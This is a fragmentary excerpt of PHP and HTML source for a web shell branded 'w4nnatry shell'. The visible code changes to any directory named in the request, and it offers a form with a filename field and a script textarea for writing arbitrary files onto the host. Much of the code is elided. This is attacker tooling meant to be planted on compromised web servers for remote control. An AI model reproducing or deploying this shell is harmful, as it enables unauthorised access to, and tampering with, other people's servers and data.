...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>w4nnatry shell</h4></a>";
			if(isset($_7['path'])){
				$path = $_7['path'];
				chdir($path);
			}else{
		...
		<div class='card card-body text-dark input-group mb-3'>
			...
			<div class='form-check'>
				...
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control btn-sm' rows='7' name='script' placeholder='your script' $_r></textarea>
		...
		</div><div class='text-secondary'>&copy; 2022-<?=date('Y');?> w4nnatry</div>
	</div>
</div>
</body>
</html>
